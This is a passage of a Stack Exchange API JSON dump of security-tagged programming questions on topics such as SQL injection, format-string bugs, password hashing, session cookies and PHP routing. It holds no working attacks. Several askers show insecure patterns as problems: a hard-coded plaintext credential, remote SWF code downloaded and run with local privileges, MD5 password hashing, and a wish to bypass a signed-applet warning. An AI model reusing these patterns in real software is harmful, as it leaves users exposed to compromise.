stranger.</p>\n\n<p>how can i fix these insecure defaults?</p>\n"},{"tags":["c#",".net","wcf","security","data-transfer"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13091606,"title":"secure file transfer over the internet","body":"<p>What is the best way to transfer files (secure data) over the internet? I am thinking about WCF REST services. The file size is less than 10MB.  Our company do not allow FTP transfer. Could you please suggest if there are any articles or third party tools? I appreciate any suggestions.  </p>\n"},{"tags":["java","security","authentication"],"answer_count":5,"favorite_count":7,"up_vote_count":17,"down_vote_count":0,"view_count":546,"score":17,"question_id":12937641,"title":"Handling passwords used for auth in source code","body":"<p>Assuming that I'm trying to pull from a RESTful api that uses basic authentication / basic certificates, what would be the best way to store that user name and password in my program?   Right now it's just sitting there in plaintext.</p>\n\n<pre><code>UsernamePasswordCredentials creds = new UsernamePasswordCredentials(\"myName@myserver\",\"myPassword1234\");\n</code></pre>\n\n<p>Is there some way of doing this that is more security minded?</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","java-ee","pki"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13035276,"title":"PKI baked into J2EE application","body":"<p>This community has been extremely helpful in education of various nuances with PKI. I do have a question of baking PKI support within applications. </p>\n\n<p>How do I bake PKI support within a JAVA application. I understand we have dogtag and EBJCA but that is geared towards the complete infrastructure setup. I need the ability to allow my application to use PKI - whether ours or the clients. </p>\n\n<p>How do you folks do this ?</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13089070,"title":"Unique (device based) salt in Android","body":"<p>I'm implementing the Google's licensing system and for the obfuscator I need to generate a unique id. The documentation says </p>\n\n<pre><code>/**\n * @param salt an array of random bytes to use for each (un)obfuscation\n * @param applicationId application identifier, e.g. the package name\n * @param deviceId device identifier. Use as many sources as possible to\n *    create this unique identifier.\n */\npublic AESObfuscator(byte[] salt, String applicationId, String deviceId) {\n</code></pre>\n\n<p>In addition to the packagename and the device id obtained with </p>\n\n<pre><code>private String android_id = Secure.getString(getContext().getContentResolver(),\n                                                    Secure.ANDROID_ID); \n</code></pre>\n\n<p>what other sources can I use? </p>\n\n<p>Thanks</p>\n"},{"tags":["android","security","screenshot","ice-cream-sandwich"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":645,"score":1,"question_id":9257210,"title":"Disable screenshots in android ics","body":"<p>For one of our secure apps, there is a requirement to disable the screenshot capability for the app in Android ICS. Is this possible on a non-rooted device?<br>\nThanks,<br>\nRajath</p>\n"},{"tags":["security","authentication","random"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":27,"score":0,"question_id":13085021,"title":"When requesting a user to enter specific characters from a password, should I sort them before?","body":"<p>I have a function which takes the size of a String and randomly chooses X amount of positions from the String. It generates an array eg. [4,1,3,9]. </p>\n\n<p>Should I be sorting this before asking the user to enter the corresponding characters from their password? Eg. [1,3,4,9]. </p>\n\n<p>The benefit is usability, but I'm concerned I may be losing security by limiting the choice of characters. If I sort it, the first position requested from the user would never be the last character from the password, for example. </p>\n\n<p>Not sure if this matters at all. Thanks</p>\n"},{"tags":["java","android","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":72,"score":-4,"question_id":13082841,"title":"Is there a way to securely store files on an Android device?","body":"<p>I want to store downloaded files securely on Android device and I don't want to use encryption. How can I do it?</p>\n\n<p>Can i use <a href=\"http://developer.android.com/reference/android/content/Context.html#getDir%28java.lang.String,%20int%29\" rel=\"nofollow\">Context.getDir()</a> with MOD_PRIVATE to do it ? why not ?</p>\n"},{"tags":["web-services","spring","security","kerberos","spnego"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13054049,"title":"Is it possible to use Spring Security  Kerberos Extension to make soap calls to Kerberos protected service?","body":"<p>Is it possible to use Spring Security  Kerberos Extension to make soap calls to Kerberos protected service ? We have Wss4jSecurityInterceptor for Spring-ws , but if the soap client want to send kerberos token , we don;t have any kerberosSecurityInterceptor ? Is there a way to do this using Spring Security  Kerberos Extension? Please advise?</p>\n"},{"tags":["java","security","applet","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":77,"score":-1,"question_id":13082178,"title":"Bypass alert \"Do you want to run this application\"","body":"<p>Is there any way to convert <strong>self signed certificate to trusted</strong> one? </p>\n\n<p>So can I by pass below alert?</p>\n\n<p><img src=\"http://i.stack.imgur.com/0OKKR.png\" alt=\"enter image description here\"></p>\n\n<p>I have one applet which trying to run some application on user's machine. </p>\n\n<p>I am using self signed jar.</p>\n"},{"tags":["sql","security","sql-injection","prepared-statement"],"answer_count":7,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":872,"score":5,"question_id":8263371,"title":"How prepared statements can protect from SQL injection attacks?","body":"<p>How <a href=\"http://en.wikipedia.org/wiki/Prepared_statement\"><code>prepared statements</code></a> can protect from <a href=\"http://en.wikipedia.org/wiki/SQL_injection\"><code>SQL injection</code></a> attacks?</p>\n\n<p>Wikipedia says:</p>\n\n<blockquote>\n  <p>Prepared statements are resilient against SQL injection, because\n  parameter values, which are transmitted later using a different\n  protocol, need not be correctly escaped. If the original statement\n  template is not derived from external input, SQL injection cannot\n  occur.</p>\n</blockquote>\n\n<p>But I can not see the reasons well, can any one kindly give a simple explanation with easy english (english is not my native lang) and some examples?</p>\n"},{"tags":["actionscript-3","security","air","flash-builder","sandbox"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":727,"score":3,"question_id":6333239,"title":"execute remote SWF in AIR Security Sandbox","body":"<p>I try to download an external SWF and run it within the AIR security sandbox.</p>\n\n<p>this is the code of the AIR application:</p>\n\n<pre><code>public class Downloader extends Sprite\n{\n\n    private static const REMOTE_FILE:URLRequest = new URLRequest(\"http://myserver.com/downloadable.swf\");\n    private var _main:NativeWindow;\n\n    public function Downloader()\n    {\n        var loader:URLLoader = new URLLoader(REMOTE_FILE);\n        loader.dataFormat = URLLoaderDataFormat.BINARY;\n        loader.addEventListener(Event.COMPLETE, downloadComplete);\n    }\n\n    private function downloadComplete(e:Event):void{\n        var ba:ByteArray = e.target.data;\n        var stream:FileStream = new FileStream();\n        var file:File = File.applicationStorageDirectory.resolvePath(\"downloadable.swf\");\n        stream.open(file, FileMode.WRITE);\n        stream.writeBytes(ba);\n        stream.close();\n\n        loadAndRunSwf();\n    }\n\n    private function loadAndRunSwf(){       \n        this._main = new NativeWindow();\n        this._main.width = 1024;\n        this._main.height = 768;\n\n                    ////obsolete?\n        //var context:LoaderContext = new LoaderContext();\n        //context.allowLoadBytesCodeExecution = true;\n        //context.applicationDomain = ApplicationDomain.currentDomain;  \n\n        var file:File = File.applicationStorageDirectory.resolvePath(\"downloadable.swf\");\n        var loader:Loader = new Loader();\n        loader.load(new URLRequest(file.url)/*,context*/);\n\n        this._main.stage.addChild(loader);\n        this._main.activate();\n    }\n}\n</code></pre>\n\n<p>Code of the downloadable.swf:</p>\n\n<pre><code>public class Downloadable extends Sprite\n{\n    private var _btn:Button = new Button();\n    private var _baseFolder:File = new File(\"app-storage:/\");\n\n    public function downloadable_test()\n    {\n        this.addChild(_btn);\n        _btn.label = \"access Harddisk\";\n                    ...\n    }\n}\n</code></pre>\n\n<p>so now, If I run Downloader, it will download the swf and try to run it, but i'll get an exception in Downloadable on the line</p>\n\n<pre><code>    private var _baseFolder:File = new File(\"app-storage:/\");\n</code></pre>\n\n<p>the error:</p>\n\n<pre><code>SecurityError: file\nat runtime::SecurityManager$/checkPrivilegeForCaller()\n</code></pre>\n\n<p>So - what Do I need to do to prevent such security errors? I want my remote SWF to be treated as native code running in the same security sandbox as the AIR code.</p>\n"},{"tags":["security","geolocation","location"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13080307,"title":"Location of Azure Servers","body":"<p>There are certain legal restrictions on the ability of a business to transfer an individual's personal information outside Australia.  Am I right in understanding that there is no data centre in Australia and therefore in all cases my data will be transferred outside Australia?\nIf this is the case, can I chose the geo-location?  If not, is there some statement I could make in my Terms as to where that data would/might be stored?  EG. \"in any one of Windows Azure's global Data Centres\", or \"in their South East Asian Data Centre\".  I could imagine that uncertainty my clients have about the location of a server/data might be an added security feature in itself (in that Windows does not disclose the location).\nKind Regards</p>\n"},{"tags":["windows","security","regedit"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13078984,"title":"Windows Registry access denied when administrator","body":"<p>Windows 7 workstation, \nLaunch '<em><code>regedit.exe</code></em>' as 'Administrator'</p>\n\n<p>Find the following registry key:</p>\n\n<pre><code>HKEY_CLASSES_ROOT\\CLSID{76A64158-CB41-11D1-8B02-00600806D9B6}\n</code></pre>\n\n<p>Right click and select 'Permissions'\nChange owner to administrators group.\nChange permissions for administrators group. Grant Full Control.\nI get an error saying: </p>\n\n<blockquote>\n  <p>unable to save permission, access denied</p>\n</blockquote>\n\n<p>Why do get access denied when I run as administrator?</p>\n"},{"tags":["security","iis","iis-7.5","isapi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13061349,"title":"IIS 7.5 ISAPI Application Pool Security","body":"<p>I'm running an ISAPI dll under IIS 7.5, and wish to use Bill Egge's ISAPI Loader dll so an updated dll can be swapped out without stopping the server.</p>\n\n<p>If I set the security on the directory holding the DLL to \"everyone\" with \"full control\" then it works as designed (a dll with an *.update extension automatically causes the existing *.run dll to be backed up, and the new dll to be renamed with the *.run extension).</p>\n\n<p>Obviously I do not wish to use the \"everyone\" account as this blows the security wide open.  So I have removed the permissions for \"everyone\".</p>\n\n<p>My app runs under an application pool - \"TestAppPool\". I have followed the top rated answer at  <a href=\"http://stackoverflow.com/questions/7334216/iis7-permissions-overview-applicationpoolidentity\">IIS7 Permissions Overview - ApplicationPoolIdentity</a> and added security for user \"IIS AppPool\\TestAppPool\" to \"full control\".\nHowever this does not allow the *.update dll to overwrite the *.run dll.</p>\n\n<p>Can anyone point me in the right direction.</p>\n"},{"tags":["sql-server","sql-server-2008","security","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13074704,"title":"SQL Server Activity Monitor Ports","body":"<p>I'm trying to convince my IT department to grant me necessary <a href=\"http://msdn.microsoft.com/en-us/library/ms175518.aspx#Security\" rel=\"nofollow\">permissions</a> on our SQL Server 2012 instance in order to use the Activity Monitor in the Management Studio.  Our lead IT administrator is concerned about granting them because he is unsure what, if any, ports Activity Monitor listens on.  I'd like to add that I currently have access to this SQL Server instance on port 1433.</p>\n\n<p>I'm not very familiar with Activity Monitor's inner workings, are there any specific ports Activity Monitor listens on that should be a security concern?  Does anyone know any resources that may provide this information?  I want to make sure I give an accurate response.</p>\n"},{"tags":["php","security","codeigniter","web-applications","frameworks"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":13073970,"title":"Good Php Framework for strong security","body":"<p>I'm trying to choose a framework that provides really good security of web applications, protects against as much of OWASP Top-10 as possible, such as:</p>\n\n<ul>\n<li>Sql Injection</li>\n<li>XSS </li>\n<li>CSRF</li>\n<li>Authentication</li>\n<li>Authorization</li>\n<li>etc.</li>\n</ul>\n\n<p>the thing is I've tried researching really heavily:\nCakephp, Zend, Yii, Code Igniter, Kohana and some have <em>basic</em> authentication, maybe a little authorization, but nothing for any application that needs solid code-security.</p>\n\n<p>Is most of the vulnerability types above currently secured by only writing custom code in these frameworks? </p>\n\n<p>This is kinda my first experience with using frameworks, everything up til this point has been custom php web apps. My whole thought for php-frameworks was it was going to be <em>easy</em> to protect against these vulnerabilities, given it isn't <em>natively</em>, why use one? Or is there a framework out there I'm not looking at which is better than those listed above for strong web app security? Thanks</p>\n"},{"tags":["php","javascript","apache","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13075003,"title":"Session Cookie without HttpOnly flag set","body":"<p>I have joust built a website with a login system. After I've just got ready I have scanned it with Acunetix, but I got the following message:</p>\n\n<p>Session Cookie without HttpOnly flag set\nSession Cookie without Secure flag set (i guess this is only if I have SSL connection)</p>\n\n<p>So my question would be, that how can I set HttpOnly flag for all my Session data? I'm just using sessions when I log in the users. I'm giving them a session with their userID number and than I'm getting data using that userID.</p>\n\n<p>Is there any simple way that I can set ALL of the session HTTPOnly and secure them, so noone can touch them?</p>\n"},{"tags":["windows","security","command-line"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13073765,"title":"Security of plain-text passwords in windows command-prompt","body":"<p>This is a question with a rather small scope, but I'm running a lot of windows command prompt commands that involve using the admin password. I can either have part of the command be \"/user:administrator /password:examplepassword\", where examplepassword is in plaintext, or I can just have \"/user:administrator\", and it prompts me for the password, which I then enter masked (<strong><em>*</em>**<em>*</em>**<em>*</em></strong>). </p>\n\n<p>So, my question is simply this: is entering the password in the plaintext secure? (obviously besides the simple over-the-shoulder insecurity of it). Are command line arguments saved anywhere on the computer after a command prompt session is closed?</p>\n\n<p>Thanks! </p>\n"},{"tags":["javascript","security","script","subdomain","same-origin-policy"],"answer_count":0,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":34,"score":4,"question_id":13074711,"title":"User-specific Subdomains : JavaScript security","body":"<p>If I provide a public-facing website for users on my website at their own subdomain (e.g. <code>bob.myapp.com</code>) under their own control, can I allow them to execute arbitrary JavaScript without putting my main app server at risk (e.g. <code>myapp.com</code>)?  The users would be able to put their own <code>*.js</code> files in the public root of their subdomains.</p>\n\n<p>I have an <strong>extremely</strong> limited understanding of the JS Same Origin Policy, but I believe that different subdomains count as different origins.  Therefore if my main app (<code>myapp.com</code>) is secured from XSS etc., is there anything specific I need to worry about from the users' subdomains that I wouldn't have to worry about for any other external source?</p>\n\n<p>Thanks!</p>\n"},{"tags":["javascript",".net","ajax","security","textbox"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":6422529,"title":"Firefox Remembers Textbox Value in Advance in .NET","body":"<p>I have multiple textboxes to enter credit card and security number for it. But I dont want browsers to remember which numbers the customer entered to them. </p>\n\n<p>Note: The page is completely sending ajax request by using javascript for any operations.</p>\n\n<p>Refers to : <a href=\"http://stackoverflow.com/questions/582244/is-there-a-w3c-valid-way-to-disable-autocomplete-in-a-html-form\">Is there a W3C valid way to disable autocomplete in a HTML form?</a></p>\n"},{"tags":["java","security","signature","malware"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":53,"score":3,"question_id":13071139,"title":"Signature malware detection","body":"<p>I'm writing malware detection based on signature scanning. As I understood, the main idea is to compare signature of scanned file with signatures in your blacklist. \n<a href=\"http://computer-programming-languages.knoji.com/create-your-own-professional-antivirus-program-using-the-programming-software-visual-basic/\" rel=\"nofollow\">Here</a> I found that signature is some kind of MD5 hash, but how can I get it from file? And are there any other types of signatures?</p>\n"},{"tags":["c#",".net","security","firewall","antivirus"],"answer_count":4,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":209,"score":8,"question_id":6302830,"title":"Application shown as threat by AVG","body":"<p>I am working on project in VB.Net that includes Socket Communication and embedded HTTPListeners, this is a group of applications that intercommunicate using Sockets. My problem is from few days I received report of Anti-virus (AVG) showing one of executable as threat. </p>\n\n<p>Looking into the matter I was thinking to replace sockets with NamedPipes but still http listener would remain there.</p>\n\n<p>How can I solve this problem</p>\n"},{"tags":["asp.net","security","custom-attributes"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13071615,"title":"C# MVC - Overriding AuthorizeCore from AuthorizeAttribute is not being invoked","body":"<p>For some reason, only the method <code>OnAuthorization</code> is being invoked, but <code>AuthorizeCore</code> not.<br>\nthis is how I call it:</p>\n\n<pre><code>[AuthorizeWithRoles(Roles = \"Affiliate\")]\npublic string TestOnlyAffiliate()\n{\n     return \"ok\";\n}\n</code></pre>\n\n<p>this is the actual attribute.</p>\n\n<pre><code>public class AuthorizeWithRolesAttribute : AuthorizeAttribute\n{\n\n    public string Roles { get; set; }\n\n    //\n    //AuthorizeCore - NOT INVOKING!\n    //\n    protected override bool AuthorizeCore(HttpContextBase httpContext)\n    {\n        return true;\n    }\n    public  void OnAuthorization(AuthorizationContext filterContext)\n    {\n\n    }\n}\n</code></pre>\n"},{"tags":["php","security","oop"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":120,"score":1,"question_id":13058253,"title":"Is this PHP code dangerous?","body":"<p>I've just sketched up the main index.php file. It should be the gateway for all the site requests. The reason why I want that is to have clean URLs.</p>\n\n<p>I have split my website into modules. (Example: register, articles etc..)</p>\n\n<p>Then I've included some lines in .htaccess, one is this:</p>\n\n<pre><code>RewriteRule ^([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?$ index.php?1=$1&amp;2=$2&amp;3=$3&amp;4=$4&amp;5=$5&amp;6=$6&amp;7=$7&amp;8=$8&amp;9=$9 [L,NC] \n</code></pre>\n\n<p>This just maps each \"folder\" to the right $_GET element... domain/1/hi/3</p>\n\n<pre><code>$_GET['2'] == 'hi'; // TRUE\n</code></pre>\n\n<p>So I want to run the module based on the first $_GET element. This way I can keep my project organized. And all files associated with a module is inside its folder.</p>\n\n<p>Here is my folder structure:</p>\n\n<pre><code>/\n    modules/\n        register/\n            ajax/\n                process.php\n            register.php\n        articles/\n            articles.php\n    index.php\n</code></pre>\n\n<p>And here is the PHP-code to map everything (index.php):</p>\n\n<pre><code>&lt;?php\n\n$basePath = 'modules';\n\nfor ($x = 1; $x &lt;= 9; $x++) {\n    if (preg_match('/[^a-zA-Z0-9-]/', $_GET[$x])) {\n        require_once(__DIR__ . \"/$basePath/404/404.php\");\n        die();\n    }\n}\n\n$baseModule = $_GET['1'];\n\nif (file_exists(__DIR__ . \"/$basePath/$baseModule/$baseModule.php\")) {\n    require_once(__DIR__ . \"/$basePath/$baseModule/$baseModule.php\");\n} else {\n    require_once(__DIR__ . \"/$basePath/404/404.php\");\n}\n</code></pre>\n\n<p>Is this dangerous code? The reason why I do the regex is to check that the GETs doesn't contain . or / which could be used to do ../ and thus run virtually any file on the server...</p>\n\n<p>Does this still pose a security hole, a potential security hole, or is it in fact, bad practice?</p>\n\n<p>What is the best approach to this problem?</p>\n"},{"tags":["javascript","security","xss","wymeditor"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13069368,"title":"Is it safe to use a Wymeditor on a live site? Could an automated script disable javascript?","body":"<p>Im curious, the pages in question are password protected but it got me thinking. Im experitmenting with the Wymeditor J-Query plugin, it works rather well and deals with XSS scripting attempts by automatically converting angle brackets into html characters etc.</p>\n\n<p>Obviously with direct access a user could disable javascript and then insert any manner of malicious tags into the DB. However i am wondering would it be possible for an automated script to disable javascript if it managed to get buy the password protection, and thus insert malicious scripts to the DB which would then be run when DB information is displayed on another page??</p>\n\n<p><strong>* UPDATE *</strong></p>\n\n<p>I should probably have expanded a bit. I would usually strip_tags() and use prepared statements however for Wymeditor to be of any use to the client then I can't use strip_tags(). I know I could write some code to remove any malicious looking content but im not sure just how much malicious content i would be looking for, im assuming XSS attacks are alot more varied than just &lt; script >do bad stuff&lt; script > type of thing.</p>\n"},{"tags":["security","principles"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13069555,"title":"Does \"Total mediation\" is a part of \"Defense in depth\" principle?","body":"<p>I understand that Total Mediation is about constant re-checking of authorisation on all levels of execution. And Defense in Depth is more about building a number of independent security means that should be all passed for attack to be successful. And it looks like Total Mediation is a one of the means of Defense in Depth. So what is the point to have two security principles instead of one?</p>\n"},{"tags":["security","implementation","xacml"],"answer_count":12,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":3487,"score":6,"question_id":2893247,"title":"Who does actually use XACML?","body":"<p>Who knows actively developed XACML Implemtations other than the Sun XACML Implementation and XEngine?</p>\n\n<p>Who uses them in their products?</p>\n\n<p>Which vendors provide a PDP? I read something about a WebLogic XACML Privider. What other products support XACML?</p>\n"},{"tags":["javascript","asp.net","security","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13067974,"title":"protecting HTTP traffic from sniffing","body":"<p>Sorry if this question was asked, but i haven't found exact question. I have HTML form that is being submited in plaintext. I know that there is HTTPs with SSL, but i don't want to buy certificate. Is it possible in some way to encrypt form data? I am thinking about two things:</p>\n\n<ul>\n<li>hashing form data via javascript - in fact i only want to send password so i don't need to know its' origin value.</li>\n<li>RSA - not sure if it could be implemented in javascript.\nWhat would you suggest? Any other variants?</li>\n</ul>\n"},{"tags":["c#","asp.net-mvc","security","userprincipal"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13068447,"title":"Principal get lost after one requst","body":"<p>I have the function <code>AffiliateLogin</code> in a controller that sets the <code>Principal</code>.<br>\nthe row <code>principal.User = user;</code> is actually the one storing the Principal.\nBut after I redirect to another controller, and test my <code>AuthorizeWithRolesAttribute</code> attribute, the principal is reset.\nthis is one second after the login, you can see the red arrow:  </p>\n\n<p><img src=\"http://i.stack.imgur.com/N9OT9.png\" alt=\"enter image description here\"></p>\n\n<p>this is the function that stores it.<br>\nWhat am I doing wrong?<br>\nThanks  </p>\n\n<pre><code>public JsonResult AffiliateLogin(string email, string password)\n        {\n            if (ModelState.IsValid)\n            {\n                Affiliate user = api.GetUserByCredencials&lt;Affiliate&gt;(email, password);\n                if (user != null)\n                {\n\n                     IIdentity identity = new UserIdentity(true,user.Email);\n                    UserPrincipal principal = new UserPrincipal(identity, new string[] {\"Affiliate\"});\n                    principal.User = user;\n\n                    HttpContext.User = principal;\n                    return Json(\"Login success\");\n                }\n            }\n            return Json(\"Fail To Login\");\n        }\n</code></pre>\n"},{"tags":["android","security","smali"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13068044,"title":"Identifying the leaked private informations by inspecting smali code of Android application","body":"<p>I'm trying to detect the leakage of private information by inspecting the smali code of Android applications. My strategy so far is.. searching the code that substitutes a personal information (e.g. IMEI, phone number) into a variable, then trace that variable until the point where it's sent to the internet or where it's not used anymore.</p>\n\n<p>Are there any nice tools for doing this?</p>\n\n<p>I've tried </p>\n\n<ul>\n<li>apkinspector (http://code.google.com/p/apkinspector/)</li>\n<li>androguard (http://code.google.com/p/androguard/)</li>\n<li>androwarn (https://github.com/maaaaz/androwarn)</li>\n</ul>\n\n<p>, but none of these are likely to be able to do what I want.</p>\n"},{"tags":["c","security","format-string"],"answer_count":6,"favorite_count":7,"up_vote_count":11,"down_vote_count":0,"view_count":1374,"score":11,"question_id":7459630,"title":"How can a Format-String vulnerability be exploited?","body":"<p>I was reading about vulnerabilities in code and came across this <em>Format-String Vulnerability</em>. </p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Uncontrolled_format_string\" rel=\"nofollow\">Wikipedia</a> says:</p>\n\n<blockquote>\n  <p>Format string bugs most commonly appear when a programmer wishes to\n  print a string containing user supplied data. The programmer may\n  mistakenly write printf(buffer) instead of printf(\"%s\", buffer). The\n  first version interprets buffer as a format string, and parses any\n  formatting instructions it may contain. The second version simply\n  prints a string to the screen, as the programmer intended.</p>\n</blockquote>\n\n<p>I got the problem with printf(buffer) version, but I still didn't get how this vulnerability can be used by attacker to execute harmful code. Can someone please tell me how this vulnerability can be <strong>exploited</strong> by an example?</p>\n"},{"tags":["security","passwords","md5","saltedhash","salt-creation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13062633,"title":"Global site salt, is it worth it?","body":"<p>I'm making a user database and I was thinking about security and it just made me think, is it really worth it to have a site salt when I'm going to have unique user salts on everybody.</p>\n\n<pre><code>md5(GLOBAL_SALT . $password . $user_salt);\n</code></pre>\n\n<p>vs</p>\n\n<pre><code>md5($password . $user_salt);\n</code></pre>\n\n<p>My thoughts is if the site were to get hacked the hackers would have access to the global salt anyway.</p>\n"},{"tags":["ajax","security","api","web","client"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":15,"score":-1,"question_id":13065520,"title":"How to secure a Mvc4 Webapi Webservice - accessed by js client [ajax]","body":"<p>I have a web-service built in mvc4 webapi, this web-service will be consumed by a website using j query or similar client side scripting technology [moo tools, knocout].</p>\n\n<p>The problem i am facing is how could i secure my web service from anyone who is not authorized to use except the one authorized client.</p>\n"},{"tags":["php","database","forms","security","hidden"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13065012,"title":"which is faster sending hidden form data or getting data from database","body":"<p>I'm using hidden form to send value. With a submit button. </p>\n\n<p>Its like:</p>\n\n<pre><code>&lt;form action=\"users.php?action=edit\" method=\"POST\"&gt;\n&lt;input type=\"hidden\" name=\"first_name\" value=\"Josh\" size=\"20\" maxlength=\"19\"/&gt;\n&lt;input type=\"submit\" name=\"done\" value=\"Done\"/&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>And i'm using these values in the next form i'm creating. I don't know which will be better, doing it like this or by getting data from database. Also, which will be more secure ?</p>\n"},{"tags":["security","rest","instagram"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13064337,"title":"How does Instagram lock down their photo upload private API endpoint?","body":"<p>I'm in the process of building a REST API for a mobile application I'm working on. Like Instagram, I'm considering locking down some of the endpoints such that they would only be accessible from my mobile app (like their photo upload endpoints). </p>\n\n<p>Has anyone have any insight as to how they locked down certain endpoints to only their app? I imagine a possible solution was the use of a shared secret to sign these specific requests and have it verified server-side before processing the upload. </p>\n"},{"tags":["php","security","passwords","phpass"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13063987,"title":"Is there a newer / improved / alternative version for phpass?","body":"<p>I'm about to implement <a href=\"http://www.openwall.com/phpass/\" rel=\"nofollow\">phpass</a> into a new application because of its theoretical and technical arguments towards security. It is of course not the only security, but for hashing passwords this seems to me like the best available.</p>\n\n<p>However, I don't get really happy when looking at its source code. It goes against some of my most basic code conventions, especially when it comes to security.</p>\n\n<pre><code>return $hash == $stored_hash;\n</code></pre>\n\n<p>I would always use the identical operator (<code>===</code>) on code around security.</p>\n\n<pre><code>if ($hash[0] == '*')\n    $hash = crypt($password, $stored_hash);\n</code></pre>\n\n<p>I would always use curly brackets <code>{</code> with an if. It doesn't matter that much whether they are on the same line, but just omitting them even though it is possible doesn't give me a good feeling.</p>\n\n<p>Also, there is no way of forcing the CRYPT_BLOWFISH method. Right now I do that by checking for the length to be exactly 60 chars in my own wrapper.</p>\n\n<p>I was wondering if someone knows an updated version? An improved one which is maintained and checked upon by a larger community then just one person? A newer version which makes all possible usage of PHP5 for example unbuffered reads <a href=\"http://www.openwall.com/articles/PHP-Users-Passwords\" rel=\"nofollow\">as the author himself already suggests</a>?</p>\n\n<p>Or maybe I'm just being paranoid with no real reason.</p>\n"},{"tags":["php","security"],"answer_count":3,"favorite_count":2,"up_vote_count":0,"down_vote_count":2,"view_count":50,"score":-2,"question_id":13063847,"title":"Is it safe to use count() on unsanitized array? php","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13062543/can-php-variable-hold-harmfull-code-safely\">Can php variable hold harmfull code safely?</a>  </p>\n</blockquote>\n\n\n\n<p>Let's say I have array named $content. The array holds harmfull data.</p>\n\n<p>Is it safe to do the following?</p>\n\n<pre><code>$test = count($content);\necho $test;\n</code></pre>\n\n<p>Would count() somehow execute the harmfull data?</p>\n"}]}
{"total":17772,"page":5,"pagesize":100,"questions":[{"tags":["php","sql","security","injection"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":13062543,"title":"Can php variable hold harmfull code safely?","body":"<p>Let's say I have a text file. It contains \"harmfull\" code like:</p>\n\n<pre><code>&lt;?php phpinfo(); ?&gt;\n</code></pre>\n\n<p>or it could be anything else, SQL injection code, html links etc...</p>\n\n<p>Now here is my example script:</p>\n\n<pre><code>$content = file_get_contents('harmfullcode.txt');\n</code></pre>\n\n<p>Now obviously $content variable will store that harmfull code.</p>\n\n<p>My question is, is it safe to store such information in a variable?</p>\n\n<p>I know for example if I</p>\n\n<pre><code>echo $content;\n</code></pre>\n\n<p>then it WILL be harmfull.</p>\n\n<p>But if I don't do anything with the variable, is it safe for the variable to hold any type of harmfull code?</p>\n\n<p><strong>Edited to make it more clear:</strong></p>\n\n<p>What is the difference between this?</p>\n\n<pre><code>$content = file_get_contents('harmfullcode.txt');\n$safevar = removebadstuff($content);\necho $safevar;\n</code></pre>\n\n<p>VS</p>\n\n<pre><code>$content = removebadstuff(file_get_contents('harmfullcode.txt'));\necho $content;\n</code></pre>\n\n<p>the second example removes bad stuff before assigning it to $content...?? I'm kind of new to php security, trying to 